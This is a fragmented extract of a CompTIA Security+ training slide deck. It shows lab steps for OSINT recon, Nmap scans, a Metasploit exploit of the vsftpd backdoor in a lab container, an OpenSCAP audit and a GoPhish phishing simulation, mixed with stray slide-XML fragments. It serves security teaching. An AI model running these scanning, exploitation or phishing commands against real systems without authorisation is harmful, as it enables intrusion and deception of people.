accept)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477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31 · Risk Register, CVSS Scoring, and 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Register, CVSS Scoring, and Quantitative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Add Key Risk Indicators to a CSV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column -t -s, kri.csv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478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31 · Risk Register, CVSS Scoring, and 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Register, CVSS Scoring, and Quantitative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the one-page board risk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board-report.md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479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Risk Register, CVSS Scoring, and Quantitative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Python output shows ALE 60,000/year and board-report.md lists 4 open risks.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480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Gather a domain's public footprint with passive OSINT tools that never send packets to the target.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Passive recon report of an authorised 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whois, dnsutils, theHarvester, subfinder, jq, crt.sh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481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Passive Reconnaissance / OSINT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theHarvester and subfinder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pip3 install --break-system-packages git+https://github.com/laramies/theHarvester.git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482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Passive Reconnaissance / OSINT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the authorised target domain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TARGET=example.com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483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Passive Reconnaissance / OSINT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Query WHOIS registrant and dates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whois $TARGET | grep -Ei "registrar|registrant|expiry|name server" | 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484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Passive Reconnaissance / OSINT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Enumerate DNS records (MX, TXT, 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dig +short MX $TARGET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485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Passive Reconnaissance / OSINT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Discover subdomains passively with subfinder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subfinder -silent -d $TARGET | tee subs.txt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486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Passive Reconnaissance / OSINT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Harvest emails and hosts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theHarvester -d $TARGET -b crtsh,duckduckgo,bing 2&gt;/dev/null | tail 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487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Passive Reconnaissance / OSINT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Pull certificate transparency records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 "https://crt.sh/?q=%25.$TARGET&amp;output=json" | jq -r '.[].name_value' | sort -u | head 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488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Passive Reconnaissance / OSINT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Build the recon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recon-$TARGET.md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489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Passive Reconnaissance /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recon-example.com.md lists the subdomain count plus DMARC and SPF records.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490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Fingerprint a local host with Nmap host discovery, version detection, OS detection, and NSE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Nmap scan of local nginx and SSH targets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nmap, nginx, openssh-server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491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Active Reconnaissance with Nmap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nmap and start nginx + ssh targets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nmap nginx openssh-server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492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Active Reconnaissance with Nmap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Discover live hosts with a ping scan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nmap -sn 127.0.0.0/30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493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Active Reconnaissance with Nmap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a TCP SYN half-open scan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nmap -sS -p 1-1024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494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Active Reconnaissance with Nmap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Detect service versions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nmap -sV -p 22,80 127.0.0.1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495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Active Reconnaissance with Nmap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Fingerprint the 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nmap -O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496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Active Reconnaissance with Nmap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NSE discovery scripts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nmap --script=banner,http-headers,ssh2-enum-algos -p 22,80 127.0.0.1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497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Active Reconnaissance with Nmap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vulnerability NSE scripts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nmap --script=vuln -p 80 127.0.0.1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498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Active Reconnaissance with Nmap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Save results in three report formats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nmap -sV -oA scan-127 127.0.0.1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499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Reconnaissance with Nmap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nmap -sV reports nginx on port 80 and OpenSSH on port 22, and scan-127.xml is written.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500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Exploit a deliberately vulnerable vsftpd service with Metasploit, prove compromise, then write the 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Metasploit exploit of a lab FTP container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metasploit-framework, docker.io, nmap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501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Penetration Testing with Metasploi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Metasploit via the Rapid7 installer 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-sSL https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; /tmp/msfinstall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502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Penetration Testing with Metasploi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Stand up the vulnerable FTP target in Docker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docker run -d --name vuln -p 2121:21 --rm tleemcjr/metasploitable2 /bin/bash -c "service vsftpd start &amp;&amp; sleep infinity"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503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Penetration Testing with Metasploi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Recon the target service banner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nmap -sV -p 2121 127.0.0.1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504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Penetration Testing with Metasploi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Search Metasploit for matching modules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msfconsole -q -x "search vsftpd; exit"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505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Penetration Testing with Metasploi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the vsftpd backdoor exploit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msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 127.0.0.1; set RPORT 2121; exploit -z; exit"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506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Penetration Testing with Metasploi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Collect post-exploitation proof (id, uname)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sessions -i 1 -c 'id; uname -a; whoami; hostname'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507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Penetration Testing with Metasploi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Clean up the target container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docker rm -f vuln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508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Penetration Testing with Metasploi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8 OF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Write the engagement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cat pentest-report.md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509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Penetration Testing with Metasploit (Authorised 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 command session opens and `id` returns uid=0(root) from the target container.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510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Audit with OpenSCAP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Audit an Ubuntu host against a CIS profile with OpenSCAP, produce the HTML report, and remediate a control.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OpenSCAP CIS compliance scan and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openscap-scanner/libopenscap8, ssg-base, ssg-debderived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511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35 · Compliance Audit with OpenSCAP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Audit with OpenSCAP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Install the SSG content and OpenSCAP scanner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apt install -y openscap-scanner || apt install -y libopenscap8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512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35 · Compliance Audit with OpenSCAP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Audit with OpenSCAP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the Ubuntu SCAP datastream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DS=$(ls /usr/share/xml/scap/ssg/content/ssg-ubuntu*-ds.xml | head -1)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513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35 · Compliance Audit with OpenSCAP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Audit with OpenSCAP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available compliance profiles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oscap info $DS | grep -A1 Profile | head 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514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35 · Compliance Audit with OpenSCAP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Audit with OpenSCAP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Run the CIS Level 1 audit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oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_cis_level1_server --results-arf arf.xml --report report.html $DS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515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35 · Compliance Audit with OpenSCAP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Audit with OpenSCAP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Generate the auto-remediation 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oscap xccdf generate fix --profile xccdf_org.ssgproject.content_profile_cis_level1_server --output remediate.sh $DS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516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35 · Compliance Audit with OpenSCAP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Audit with OpenSCAP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one fix and re-check the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oscap xccdf eval --rule xccdf_org.ssgproject.content_rule_package_telnet_removed $DS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517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Compliance Audit with OpenSCAP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report.html shows pass/fail per control and the score rises after remediation.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518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Run a controlled phishing simulation with GoPhish and a MailHog sink, tracking click and open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GoPhish campaign with a MailHog SMTP sink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gophish, docker.io, mailhog, curl, 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519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36 · Security Awareness: Run a Phishing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Download and unzip the GoPhish binary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curl -LO https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip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520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36 · Security Awareness: Run a Phishing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Bind the admin UI to all interfaces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sed -i 's/127.0.0.1:3333/0.0.0.0:3333/' config.json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521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36 · Security Awareness: Run a Phishing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Start GoPhish and note the admin password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./gophish 2&gt;&amp;1 | grep -E "admin|password" | head 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522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36 · Security Awareness: Run a Phishing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Spin up the MailHog SMTP sink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3794760"/>
            <a:ext cx="9235440" cy="8686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913632"/>
            <a:ext cx="8869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CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ docker run -d -p 1025:1025 -p 8025:8025 mailhog/mailhog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523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36 · Security Awareness: Run a Phishing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Configure the four GoPhish primitives in the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524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36 · Security Awareness: Run a Phishing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Launch the campaign and watch the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525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36 · Security Awareness: Run a Phishing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Map click rates to training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526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Security Awareness: Run a Phishing Simulation with GoPhish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campaign dashboard tracks sent/opened/clicked and test emails appear in MailHog.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527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Security Program Management &amp; Oversight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Build a risk register and score with CVSS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Collect a domain footprint using only passive tools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Fingerprint a host with Nmap scans and NSE scripts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Exploit a vulnerable target and write the report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Scan a host against a CIS profile and remediate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now: Operate a phishing simulation end-to-end with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528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529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General Concepts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Categorised controls; applied CIA, AAA, hashing, encryption and PKI.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Threats &amp; Vulns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Analysed phishing, cracked passwords, exploited SQLi/XSS, scanned and hardened.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Architecture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Segmented networks; deployed firewalls, WAF, VPN, disk &amp; TLS encryption and backup.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Hardened access; ran SIEM, IDS, EDR, FIM, vuln management, IR and automation.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Program Mgmt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Scored risk with CVSS; ran recon, pentesting, compliance and awareness testing.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530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Preparing for the SY0-701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Redo every lab until the commands and concepts are automatic.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Review the 'What you learned' notes in each lab and the Learner Guide.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Memorise the control categories/types, the CIA triad and the CVSS metrics.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SY0-701 exam is up to 90 questions in 90 minutes; passing score is 750/900.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Book the exam through Pearson VUE from your CompTIA account.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531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SY0-701 · GET CERTIFIED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Register for the CompTIA Security+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4904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490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92808"/>
            <a:ext cx="4722876" cy="1307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1 · Create a CompTIA account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Sign up at comptia.org and buy an SY0-701 exam voucher (or a voucher+retake bundle).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1636" y="1783080"/>
            <a:ext cx="5180076" cy="14904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91440" cy="14904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7668" y="1892808"/>
            <a:ext cx="4722876" cy="1307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2 · Choose delivery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at a Pearson VUE test centre, or take it online with OnVUE remote proctoring.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93008"/>
            <a:ext cx="5180076" cy="14904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493008"/>
            <a:ext cx="91440" cy="14904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02736"/>
            <a:ext cx="4722876" cy="1307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3 · Book your slot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Schedule via Pearson VUE: home.pearsonvue.com/comptia — pick date, time and mode.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3493008"/>
            <a:ext cx="5180076" cy="149047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3493008"/>
            <a:ext cx="91440" cy="1490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7668" y="3602736"/>
            <a:ext cx="4722876" cy="1307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4 · Exam-day format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 to 90 questions (MCQ + performance-based) in 90 minutes; pass mark 750/900.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57800"/>
            <a:ext cx="10634472" cy="685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58384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Arial"/>
              </a:rPr>
              <a:t>Register: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://www.comptia.org/certifications/security</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>    ·    Book: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://home.pearsonvue.com/comptia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532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EXAM READINESS · TERTIARY INFOTECH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Exam — Test Yourself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Sit the Tertiary Infotech CompTIA Security+ practice exam before your real attempt — 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timed, exam-style questions across all five domains with full explanations.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5074920" cy="2423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507492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2608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B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>How to use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7472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Attempt under timed, exam-like conditions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Review the explanation for every question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Note which domain each miss belongs to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Revisit that domain's labs, then re-take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743200"/>
            <a:ext cx="5074920" cy="2423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743200"/>
            <a:ext cx="507492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92608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What it covers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7472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All 5 SY0-701 domains, weighted like the real exam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MCQ and scenario-style questions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Instant scoring and feedback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•  Unlimited re-attempts to build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349240"/>
            <a:ext cx="10634472" cy="6400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4406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Practice exam: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://exams.tertiaryinfotech.com/practice-exams/comptia/comptia-security-plus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533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Download the slides and Learner Guide from the LMS at https://lms-tms.tertiaryinfotech.com/.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Complete the Written Assessment (WA) and Practical Performance (PP) on the LMS.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Keep the courseware open during the assessment — it is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534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(SAQ) — 6 questions, 1 hour.  Practical Performance (PP) — 5 tasks, 1 hour.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Remember to take the Assessment digital attendance (TRAQOM).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535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Take the Assessment digital attendance (TRAQOM · SSG QR on the LMS)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— 6 questions, open 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PP — 5 hands-on tasks,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536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 must take the AM, PM and Assessment digital attendance for this WSQ-funded course.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24528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468880"/>
            <a:ext cx="245287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15059" y="2834640"/>
            <a:ext cx="777240" cy="7772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15059" y="2834640"/>
            <a:ext cx="777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840480"/>
            <a:ext cx="212369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Trainer shows QR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251960"/>
            <a:ext cx="212369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trainer/administrator displays the SSG TRAQOM QR code from the portal.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1830" y="365760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4438" y="2468880"/>
            <a:ext cx="24528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4438" y="2468880"/>
            <a:ext cx="245287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42257" y="2834640"/>
            <a:ext cx="777240" cy="7772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2257" y="2834640"/>
            <a:ext cx="777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69030" y="3840480"/>
            <a:ext cx="212369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Scan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69030" y="4251960"/>
            <a:ext cx="212369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 your phone camera and scan the QR code shown on screen.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9028" y="365760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468880"/>
            <a:ext cx="24528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468880"/>
            <a:ext cx="2452878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69455" y="2834640"/>
            <a:ext cx="777240" cy="7772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9455" y="2834640"/>
            <a:ext cx="777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6228" y="3840480"/>
            <a:ext cx="212369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6228" y="4251960"/>
            <a:ext cx="212369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and submit your attendance for this session (AM / PM / Assessment).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66226" y="3657600"/>
            <a:ext cx="32918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58834" y="2468880"/>
            <a:ext cx="2452878" cy="2926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58834" y="2468880"/>
            <a:ext cx="2452878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96653" y="2834640"/>
            <a:ext cx="777240" cy="7772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6653" y="2834640"/>
            <a:ext cx="777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3426" y="3840480"/>
            <a:ext cx="212369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75% required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3426" y="4251960"/>
            <a:ext cx="2123694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75% attendance is required for assessment eligibility and funding.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537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STAY SECURE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are now ready to secure Linux systems — and to sit the CompTIA Security+ SY0-701 exam.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Security+ (SY0-701)  ·  TGS-2023039181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